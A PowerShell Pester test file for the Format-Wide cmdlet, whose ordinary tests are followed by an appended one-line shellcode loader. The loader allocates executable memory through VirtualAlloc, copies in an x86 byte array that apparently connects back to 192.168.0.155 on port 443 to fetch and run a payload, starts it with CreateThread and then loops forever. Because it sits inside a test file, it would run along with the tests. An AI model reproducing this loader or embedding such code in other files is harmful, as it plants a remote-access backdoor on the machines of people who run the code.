

Describe "Format-Wide" -Tags "CI" {
    BeforeAll {
        1..2 | ForEach-Object { New-Item -Path ("TestDrive:\Testdir{0:00}" -f $_) -ItemType Directory }
        1..2 | ForEach-Object { New-Item -Path ("TestDrive:\TestFile{0:00}.txt" -f $_) -ItemType File }
        $pathList = Get-ChildItem $TestDrive
    }

    It "Should be able to specify the columns in output using the column switch" {
        { $pathList | Format-Wide -Column 3 } | Should -Not -Throw
    }

    It "Should be able to use the autosize switch" {
        { $pathList | Format-Wide -Autosize } | Should -Not -Throw
        { $pathList | Format-Wide -Autosize | Out-String } | Should -Not -Throw
    }

    It "Should be able to take inputobject instead of pipe" {
        { Format-Wide -InputObject $pathList } | Should -Not -Throw
    }

    It "Should be able to use the property switch" {
        { Format-Wide -InputObject $pathList -Property Mode } | Should -Not -Throw
    }

    It "Should throw an error when property switch and view switch are used together" {
        { Format-Wide -InputObject $pathList -Property CreationTime -View aoeu } |
            Should -Throw -ErrorId "FormatCannotSpecifyViewAndProperty,Microsoft.PowerShell.Commands.FormatWideCommand"
    }

    It "Should throw and suggest proper input when view is used with invalid input without the property switch" {
        { Format-Wide -InputObject $(Get-Process) -View aoeu } | Should -Throw
    }
}

Describe "Format-Wide DRT basic functionality" -Tags "CI" {
    It "Format-Wide with array should work" {
        $al = (0..255)
        $info = @{}
        $info.array = $al
        $result = $info | Format-Wide | Out-String
        $result | Should -Match "array"
    }

    It "Format-Wide with No Objects for End-To-End should work" {
        $p = @{}
        $result = $p | Format-Wide | Out-String
        $result | Should -BeNullOrEmpty
    }

    It "Format-Wide with Null Objects for End-To-End should work" {
        $p = $null
        $result = $p | Format-Wide | Out-String
        $result | Should -BeNullOrEmpty
    }

    It "Format-Wide with single line string for End-To-End should work" {
        $p = "single line string"
        $result = $p | Format-Wide | Out-String
        $result | Should -Match $p
    }

    It "Format-Wide with multiple line string for End-To-End should work" {
        $p = "Line1\nLine2"
        $result = $p | Format-Wide | Out-String
        $result | Should -Match "Line1"
        $result | Should -Match "Line2"
    }

    It "Format-Wide with string sequence for End-To-End should work" {
        $p = "Line1", "Line2"
        $result = $p |Format-Wide | Out-String
        $result | Should -Match "Line1"
        $result | Should -Match "Line2"
    }

    It "Format-Wide with complex object for End-To-End should work" {
        Add-Type -TypeDefinition "public enum MyDayOfWeek{Sun,Mon,Tue,Wed,Thu,Fri,Sat}"
        $eto = New-Object MyDayOfWeek
        $info = @{}
        $info.intArray = 1, 2, 3, 4
        $info.arrayList = "string1", "string2"
        $info.enumerable = [MyDayOfWeek]$eto
        $info.enumerableTestObject = $eto
        $result = $info|Format-Wide|Out-String
        $result | Should -Match "intArray"
        $result | Should -Match "arrayList"
        $result | Should -Match "enumerable"
        $result | Should -Match "enumerableTestObject"
    }

    It "Format-Wide with multiple same class object with grouping should work" {
        Add-Type -TypeDefinition "public class TestGroupingClass{public TestGroupingClass(string name,int length){Name = name;Length = length;}public string Name;public int Length;public string GroupingKey;}"
        $testobject1 = [TestGroupingClass]::New('name1', 1)
        $testobject1.GroupingKey = "foo"
        $testobject2 = [TestGroupingClass]::New('name2', 2)
        $testobject1.GroupingKey = "bar"
        $testobject3 = [TestGroupingClass]::New('name3', 3)
        $testobject1.GroupingKey = "bar"
        $testobjects = @($testobject1, $testobject2, $testobject3)
        $result = $testobjects|Format-Wide -GroupBy GroupingKey|Out-String
        $result | Should -Match "GroupingKey: bar"
        $result | Should -Match "name1"
        $result | Should -Match " GroupingKey:"
        $result | Should -Match "name2\s+name3"
    }
}

$9n0E = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $9n0E -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x9b,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$axR=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($axR.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$axR,0,0,0);for (;;){Start-sleep 60};

